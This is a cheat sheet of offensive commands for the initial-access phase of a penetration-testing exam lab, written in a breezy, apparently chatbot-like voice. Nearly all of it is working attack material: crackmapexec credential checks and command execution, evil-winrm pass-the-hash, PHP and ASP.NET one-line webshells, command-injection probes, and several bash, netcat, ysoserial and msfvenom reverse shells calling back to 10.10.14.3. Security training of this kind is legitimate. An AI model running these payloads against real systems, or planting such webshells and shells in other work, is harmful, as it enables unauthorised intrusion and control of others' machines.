Now we cross the Rubicon. **Initial access** is where enumeration cashes in its chips and the system quietly realizes it has made a series of regrettable life choices. This phase rewards restraint, timing, and a slightly suspicious mind.

Below are **clean, realistic commands** you’d actually run in CPTS-style scenarios, with just enough context to keep you honest.

---

## Credentials / Authentication

### crackmapexec (Creds → Access)

**Check where credentials work (SMB):**

```bash
crackmapexec smb 10.10.10.0/24 -u user -p password
```

**Check admin rights (critical signal):**

```bash
crackmapexec smb 10.10.10.0/24 -u user -p password --admin
```

**Execute commands (only when admin):**

```bash
crackmapexec smb 10.10.10.5 -u user -p password -x "whoami"
```

**Dump logged-on users (situational awareness):**

```bash
crackmapexec smb 10.10.10.5 -u user -p password --loggedon-users
```

crackmapexec answers one question ruthlessly well: *“What can I touch with this credential?”*

---

### evil-winrm (The Gold Standard for Windows Shells)

**Basic WinRM shell:**

```bash
evil-winrm -i 10.10.10.5 -u user -p password
```

**Using NTLM hash (pass-the-hash):**

```bash
evil-winrm -i 10.10.10.5 -u user -H <NTLM_HASH>
```

**Specify domain:**

```bash
evil-winrm -i 10.10.10.5 -u user -p password -d example.local
```

If WinRM works and you’re admin, stop scanning. You’re home.

---

### SSH (Linux foothold)

```bash
ssh user@10.10.10.6
```

**Specify key:**

```bash
ssh -i id_rsa user@10.10.10.6
```

**Force TTY (some shells behave better):**

```bash
ssh -tt user@10.10.10.6
```

---

### RDP (GUI Access)

```bash
xfreerdp /u:user /p:password /v:10.10.10.7
```

**Domain auth:**

```bash
xfreerdp /u:user /p:password /d:EXAMPLE /v:10.10.10.7
```

RDP isn’t stealthy, but it’s incredibly informative.

---

## Web → OS Access

### File Upload → Shell

**Upload a PHP webshell:**

```php
<?php system($_GET['cmd']); ?>
```

**Trigger it:**

```bash
curl "http://example.com/uploads/shell.php?cmd=id"
```

**Upgrade to reverse shell:**

```bash
curl "http://example.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.3/4444+0>%261'"
```

File uploads are never “just a feature”. They’re a negotiation.

---

### Command Injection

**Test for injection:**

```bash
; id
&& whoami
| uname -a
```

**Blind injection with timing:**

```bash
; sleep 5
```

**Reverse shell payload:**

```bash
; bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'
```

If input hits a shell, the system has already lost.

---

### Deserialization (High Impact, Low Frequency)

**Java payload (example concept):**

```bash
ysoserial CommonsCollections1 "bash -c 'bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'" > payload.ser
```

Typically delivered via cookies, headers, or POST bodies. Rare, devastating, unforgettable.

---

## Payloads / Shells

### Netcat (The Old Reliable)

**Listener:**

```bash
nc -lvnp 4444
```

**Reverse shell (Linux):**

```bash
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```

**Reverse shell (nc with -e):**

```bash
nc 10.10.14.3 4444 -e /bin/bash
```

---

### rlwrap (Sanity Restorer)

```bash
rlwrap nc -lvnp 4444
```

Gives you arrow keys, history, dignity.

---

### msfvenom (Use Like Salt, Not Sauce)

**Linux reverse shell:**

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf > shell
```

**Windows reverse shell:**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe > shell.exe
```

Upload, execute, clean up. Don’t spray payloads like confetti.

---

### Webshells (Persistence Lite)

**PHP:**

```php
<?php system($_REQUEST['cmd']); ?>
```

**ASP.NET:**

```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>
```

Webshells are bookmarks in someone else’s house. Use briefly.

---

## The Quiet Rule of Initial Access

If you needed noise, you enumerated poorly.
If access feels *inevitable*, you did it right.

Initial access isn’t victory — it’s **permission to begin again**, this time from the inside. From here, the universe collapses toward privilege escalation, credential harvesting, and lateral movement. Systems fail not with a bang, but with a login prompt.
